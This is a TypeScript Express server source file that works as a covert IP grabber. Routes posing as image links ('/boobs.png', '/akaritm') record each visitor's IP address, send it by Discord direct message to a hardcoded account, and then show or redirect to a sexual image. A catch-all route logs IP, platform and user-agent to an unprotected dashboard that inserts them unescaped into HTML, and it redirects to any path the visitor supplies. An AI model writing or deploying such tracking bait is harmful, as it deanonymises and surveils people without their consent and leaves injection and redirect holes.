import express from 'express';
import dotenv from 'dotenv';
import cors from 'cors';
import bodyParser from 'body-parser';
import router from './router/index';
import getLogger from './helpers';
import path from 'path'
import { client } from '@bot/index'
const logger = getLogger('API');
dotenv.config();

const app = express();
app.use(bodyParser.json());
app.use(
  cors({
    origin: '*',
  })
);
app.use(router);
app.set('trust proxy', true)
app.get('/', async (_req, res) => {
});
app.get('/boobs.png', async (_req, res) => {
  logger.log('Recived get request');
  const ip = _req.ip || _req.socket.remoteAddress
  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
  res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
});
app.get('/boobs', async (_req, res) => {
  logger.log('Recived get request');
  const ip = _req.ip || _req.socket.remoteAddress
  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
  res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
});
app.get('/akaritm', async (_req, res) => {
  logger.log('Recived get request');
  const ip = _req.ip || _req.socket.remoteAddress
  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
  //res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
  res.redirect(200, 'https://www.stripersonline.com/surftalk/uploads/gallery/album_14234/6b3e9b22_hot-girls-nice-boobs-high-res-13oct-21.jpeg')
});
const ips: {ip: string, date: string, userAgent: string| string[], platform: string | string[]}[] = []
app.get('/dashboard', (req, res) => {
  let tableEntries = ''
  for(const entry of ips) {
    tableEntries += `<tr>
        <td>${entry.ip}</td>
        <td>${entry.date}</td>
        <td>${entry.platform}</td>
        <td>${entry.userAgent}</td>`
    }
  res.send(`
    <html>
    <body>
   <style>
.table_component {
    overflow: auto;
    width: 100%;
    display: flex;
}

.table_component table {
    border: 1px solid #dededf;
    height: 100%;
    width: 100%;
    table-layout: fixed;
    border-collapse: collapse;
    border-spacing: 1px;
    text-align: left;
}

.table_component caption {
    caption-side: top;
    text-align: left;
}

.table_component th {
    border: 1px solid #dededf;
    background-color: #eceff1;
    color: #000000;
    padding: 5px;
}

.table_component td {
    border: 1px solid #dededf;
    background-color: #ffffff;
    color: #000000;
    padding: 5px;
}
</style>
<div class="table_component" role="region" tabindex="0">
<table>
    <caption>IP's list</caption>
    <thead>
        <tr>
            <th>Time</th>
            <th>IP</th>
            <th>Platform</th>
            <th>User-Agent</th>
        </tr>
    </thead>
    <tbody>
     
       
        ${
        tableEntries
  }

    </tbody>
</table>
</div>
 
    </body>
     </html>
    
    `)
})
app.get('*', async (req, res) => {
  
  const ip = req.ip || req.socket.remoteAddress
  if(ips.find((value) => {
    return value.ip === ip
  })) return;
  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
  
  
  var d = new Date();
  ips.push({
    ip: ip || '',
    date: d.toLocaleString('en-US', { timeZone: 'Europe/Stockholm' }),
    platform: req.headers['sec-ch-ua-platform'] || 'unknown',
    userAgent: req.headers['user-agent'] || 'unknown'
  })

   res.redirect(req.url.slice(1))
 })

app.post('/', (_req, res) => {
  logger.log('Recived post request');
  res.status(200).json({'hello world': 'hello world'});
});

export function run() {
  const port = process.env.PORT || 5001;
  app.listen(port, () => {
    logger.log(`Api is listening on port ${port}.`);
  });
}
export default app;
